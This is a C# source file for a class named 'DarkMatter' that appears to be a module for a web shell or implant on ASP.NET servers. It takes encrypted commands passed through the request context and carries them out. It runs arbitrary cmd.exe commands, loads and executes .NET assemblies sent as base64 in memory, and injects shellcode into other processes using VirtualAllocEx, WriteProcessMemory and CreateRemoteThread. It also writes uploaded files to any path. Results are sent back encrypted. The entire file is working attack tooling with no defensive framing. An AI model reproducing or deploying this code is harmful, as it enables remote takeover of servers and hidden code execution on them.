using System;
using System.Web;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Threading;

public class DarkMatter
{
    private Dictionary<string, string> fnParseParams(string szParam)
    {
        Dictionary<string, string> dic = new Dictionary<string, string>();
        if (string.IsNullOrEmpty(szParam))
            return dic;

        string[] pairs = szParam.Split('&');
        foreach (string szPair in pairs)
        {
            int nIdx = szPair.IndexOf("=");
            if (nIdx > 0)
                dic[szPair.Substring(0, nIdx).Trim()] = szPair.Substring(nIdx + 1).Trim();
        }

        return dic;
    }

    public bool Run()
    {
        HttpContext context = HttpContext.Current;
        if (context == null)
            return false;

        HttpRequest request = context.Request;
        HttpResponse response = context.Response;

        try
        {
            byte[] abPayload = (byte[])context.Items["payload"];
            object driver = context.Items["driver"];
            int nDllLength = (int)context.Items["len"];

            int nParamOffset = nDllLength + 4;
            int nParamLength = abPayload.Length - nParamOffset;
            string szParam = Encoding.UTF8.GetString(abPayload, nParamOffset, nParamLength).Trim();

            Dictionary<string, string> dic = fnParseParams(szParam);
            string szAction = dic.ContainsKey("action") ? dic["action"].ToUpper() : string.Empty;

            if (szAction.Equals("CMD"))
            {
                string szCmd = dic.ContainsKey("cmd") ? dic["cmd"] : string.Empty;
                string szOutput = "";

                if (string.IsNullOrEmpty(szCmd))
                    return true;

                ProcessStartInfo psi = new ProcessStartInfo()
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + szCmd,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                using (Process proc = Process.Start(psi))
                {
                    string stdout = proc.StandardOutput.ReadToEnd();
                    string stderr = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();
                    
                    szOutput = stdout + stderr;
                }

                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});

                response.Clear();
                response.ContentType = "application/octet-stream";
                response.BinaryWrite(abEncryptedResp);
            }
            else if (szAction == "LOAD")
            {
                byte[] abBuffer = Convert.FromBase64String(dic["buffer"]);
                Assembly asm = Assembly.Load(abBuffer);
                MethodInfo ep = asm.EntryPoint;
                if (ep != null)
                {
                    object[] args = null;
                    if (ep.GetParameters().Length > 0)
                        args = new object[] {new string[0]};

                    ep.Invoke(null, args);
                }
            }
            else if (szAction == "SHELLCODE")
            {
                int nPid = int.Parse(dic["pid"]);
                byte[] abBuffer = Convert.FromBase64String(dic["shellcode"]);

                IntPtr hProc = OpenProcess(PROCESS_ALL_ACCESS, false, nPid);
                if (IntPtr.Zero == hProc)
                    return true;

                IntPtr pAlloc = VirtualAllocEx(hProc, IntPtr.Zero, (uint)abBuffer.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (IntPtr.Zero == pAlloc)
                    return true;

                bool bIsWritten = WriteProcessMemory(hProc, pAlloc, abBuffer, (uint)abBuffer.Length, out IntPtr nWritten);
                if (!bIsWritten)
                    return true;

                IntPtr hThread = CreateRemoteThread(hProc, IntPtr.Zero, 0, pAlloc, IntPtr.Zero, 0, out uint nThreadId);
                if (IntPtr.Zero == hThread)
                    return true;

                string szOutput = nThreadId.ToString();
                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});

                response.Clear();
                response.ContentType = "application/octet-stream";
                response.BinaryWrite(abEncryptedResp);
            }
            else if (szAction == "UPLOAD")
            {
                string szPath = dic["path"];
                byte[] abBuffer = Convert.FromBase64String(dic["buffer"]);

                using (FileStream fs = new FileStream(szPath, FileMode.Append, FileAccess.Write))
                    fs.Write(abBuffer, 0, abBuffer.Length);

                string szOutput = abBuffer.Length.ToString();
                byte[] abResult = Encoding.UTF8.GetBytes(szOutput);
                var cryptMethod = driver.GetType().GetMethod("Crypt", new Type[] { typeof(byte[]), typeof(int) });
                byte[] abEncryptedResp = (byte[])cryptMethod.Invoke(driver, new object[] {abResult, 1});

                response.Clear();
                response.ContentType = "application/octet-stream";
                response.BinaryWrite(abEncryptedResp);
            }
        }
        catch (Exception ex)
        {
            response.Write("DARKMATTER_ERROR: " + ex.Message);
        }

        return true;
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
}